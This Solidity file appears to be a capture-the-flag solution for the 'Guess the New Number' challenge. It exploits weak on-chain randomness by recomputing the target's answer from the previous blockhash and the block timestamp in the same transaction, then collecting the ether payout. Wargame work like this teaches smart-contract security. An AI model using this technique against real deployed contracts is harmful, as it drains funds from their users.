// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 number) external payable;
}

contract GuessTheNewNumberSolver {
    IGuessTheNewNumberChallenge public challenge;
    address payable private owner;

    event Received(address, uint);

    constructor(address _challengeAddress) {
        challenge = IGuessTheNewNumberChallenge(_challengeAddress);
        owner = payable(msg.sender);
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        require(msg.value == 1 ether, "You must send 1 ether to solve this challenge");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: msg.value}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    function destroy() public {
        require(msg.sender == owner, "Only the owner can destroy this contract");
		selfdestruct(payable(msg.sender)); 
	}

    receive() external payable {
          emit Received(msg.sender, msg.value);
    }

}